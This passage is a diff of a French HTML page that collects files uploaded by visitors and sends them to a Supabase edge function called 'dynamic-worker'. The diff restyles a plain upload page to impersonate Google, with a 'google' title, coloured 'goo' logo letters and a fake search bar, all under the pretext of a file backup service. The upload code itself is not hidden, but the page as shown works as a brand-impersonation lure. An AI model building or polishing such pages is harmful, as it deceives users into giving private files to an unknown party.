@@ -3,104 +3,260 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Confirme ton accès</title>
+  <title>google — Sauvegarde de fichiers</title>
+
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
-      padding: 20px;
       min-height: 100vh;
-      box-sizing: border-box;
-      display: grid;
-      place-items: center;
-      background: #f1f5f9;
+      padding: 24px;
       font-family: Arial, sans-serif;
-      color: #172033;
+      background: #fff;
+      color: #202124;
+    }
+
+    .top {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      min-height: 40px;
+      font-size: 13px;
     }
 
     main {
-      background: white;
       width: 100%;
-      max-width: 430px;
-      padding: 24px;
-      box-sizing: border-box;
-      border-radius: 16px;
-      box-shadow: 0 5px 25px #0001;
+      max-width: 600px;
+      margin: 95px auto 0;
+      text-align: center;
     }
 
-    h1 { text-align: center; }
-    p { line-height: 1.5; }
-
-    button, .choose {
-      display: block;
-      width: 100%;
-      padding: 14px;
-      border: 0;
-      border-radius: 9px;
-      font-size: 16px;
-      margin-top: 14px;
-      box-sizing: border-box;
+    .logo {
+      margin: 0 0 28px;
+      font-size: clamp(64px, 12vw, 92px);
+      font-weight: 500;
+      letter-spacing: -6px;
     }
 
-    button {
-      background: #2563eb;
-      color: white;
+    .blue { color: #4285f4; }
+    .red { color: #ea4335; }
+    .yellow { color: #fbbc05; }
+    .green { color: #34a853; }
+
+    .subtitle {
+      margin: 0 0 28px;
+      color: #5f6368;
+      font-size: 15px;
+    }
+
+    .search-box {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+      min-height: 48px;
+      padding: 0 18px;
+      border: 1px solid #dfe1e5;
+      border-radius: 28px;
+      text-align: left;
+      transition: box-shadow .2s;
+    }
+
+    .search-box:hover,
+    .search-box:focus-within {
+      box-shadow: 0 1px 6px #20212430;
+      border-color: transparent;
+    }
+
+    .search-icon {
+      color: #9aa0a6;
+      font-size: 20px;
+    }
+
+    .search-text {
+      flex: 1;
+      color: #5f6368;
+      font-size: 14px;
+    }
+
+    .panel {
+      margin-top: 24px;
+      padding: 24px 20px;
+      border: 1px solid #dadce0;
+      border-radius: 18px;
+      text-align: left;
+    }
+
+    .panel h2 {
+      margin: 0 0 12px;
+      font-size: 18px;
+      font-weight: 500;
+    }
+
+    .panel p {
+      color: #5f6368;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin: 20px 0;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .consent input {
+      margin-top: 3px;
+      accent-color: #1a73e8;
+    }
+
+    button,
+    .choose {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 40px;
+      padding: 0 20px;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      background: #f8f9fa;
+      color: #202124;
+      font-size: 14px;
       cursor: pointer;
+      text-align: center;
     }
 
-    button:disabled { opacity: .45; }
+    button:hover,
+    .choose:hover {
+      border-color: #c6c6c6;
+      box-shadow: 0 1px 1px #0001;
+    }
+
+    button:disabled {
+      opacity: .45;
+      cursor: not-allowed;
+    }
 
     .choose {
-      background: #e8efff;
-      color: #1d4ed8;
-      text-align: center;
-      font-weight: bold;
-      cursor: pointer;
+      width: 100%;
+      border-color: #d2e3fc;
+      background: #e8f0fe;
+      color: #1967d2;
+      font-weight: 500;
     }
 
-    #status { overflow-wrap: anywhere; }
-    [hidden] { display: none !important; }
+    #envoyer {
+      width: 100%;
+      margin-top: 14px;
+      border: none;
+      background: #1a73e8;
+      color: #fff;
+    }
+
+    #liste {
+      overflow-wrap: anywhere;
+    }
+
+    #status {
+      margin-top: 16px;
+      overflow-wrap: anywhere;
+      font-size: 13px;
+    }
+
+    footer {
+      margin: 32px auto 0;
+      color: #70757a;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    [hidden] {
+      display: none !important;
+    }
+
+    @media (max-width: 600px) {
+      main {
+        margin-top: 55px;
+      }
+
+      .panel {
+        padding: 20px 16px;
+      }
+
+      body {
+        padding: 18px;
+      }
+    }
   </style>
 </head>
 
 <body>
-<main>
-  <h1>Confirme ton accès</h1>
+  <header class="top">
+    Sauvegarde de fichiers
+  </header>
 
-  <p>
-    accepte les condition afin de sauvegarder tes fichiers.
-  </p>
+  <main>
+    <h1 class="logo" aria-label="goo">
+      <span class="blue">g</span><span class="red">o</span><span class="yellow">o</span>
+    </h1>
 
-  <p>
-    selectionne tes fichiers que tu souhaite sauvegarder.
-  </p>
+    <p class="subtitle">
+      Un espace simple pour préparer tes fichiers à sauvegarder.
+    </p>
 
-  <label>
-    <input type="checkbox" id="accord">
-    J'accepte de sélectionner les fichiers que je souhaite sauvegarder.
-  </label>
+    <div class="search-box">
+      <span class="search-icon" aria-hidden="true">⌕</span>
+      <span class="search-text">Préparer une sauvegarde…</span>
+    </div>
 
-  <section id="partage" hidden>
-    <label class="choose" for="fichiers">
-      Choisir des fichiers
-    </label>
+    <section class="panel">
+      <h2>Préparer tes fichiers</h2>
 
-    <input
-      id="fichiers"
-      type="file"
-      multiple
-      hidden
-      accept="*/*"
-    >
+      <p>
+        Accepte les conditions ci-dessous pour afficher
+        le sélecteur de fichiers.
+      </p>
 
-    <p id="liste">Aucun fichier sélectionné.</p>
+      <label class="consent">
+        <input type="checkbox" id="accord">
+        <span>
+          J'accepte de sélectionner les fichiers que je souhaite sauvegarder.
+        </span>
+      </label>
 
-    <button id="envoyer" disabled>
-      Envoyer les fichiers sélectionnés
-    </button>
-  </section>
+      <section id="partage" hidden>
+        <label class="choose" for="fichiers">
+          Choisir des fichiers
+        </label>
 
-  <p id="status" role="status" aria-live="polite"></p>
-</main>
+        <input
+          id="fichiers"
+          type="file"
+          multiple
+          hidden
+          accept="*/*"
+        >
+
+        <p id="liste">Aucun fichier sélectionné.</p>
+
+        <button id="envoyer" disabled>
+          Envoyer les fichiers sélectionnés
+        </button>
+      </section>
+
+      <p id="status" role="status" aria-live="polite"></p>
+    </section>
+
+    <footer>
+      Outil de préparation de sauvegarde
+    </footer>
+  </main>
 
 <script>
   const SUPABASE_URL =
@@ -109,7 +265,6 @@
   const SUPABASE_KEY =
     "sb_publishable_ix6RvrM1ActTBEg97AluTw_dF9OkXey";
 
-  // Nom de la fonction actuellement indiquée dans Supabase.
   const UPLOAD_ENDPOINT =
     SUPABASE_URL + "/functions/v1/dynamic-worker";
 
@@ -138,7 +293,9 @@
     const valide =
       selection.length > 0 &&
       selection.length <= 5 &&
-      selection.every(f => f.size > 0 && f.size <= tailleMax);
+      selection.every(
+        f => f.size > 0 && f.size <= tailleMax
+      );
 
     liste.textContent = selection.length
       ? selection.map(f =>
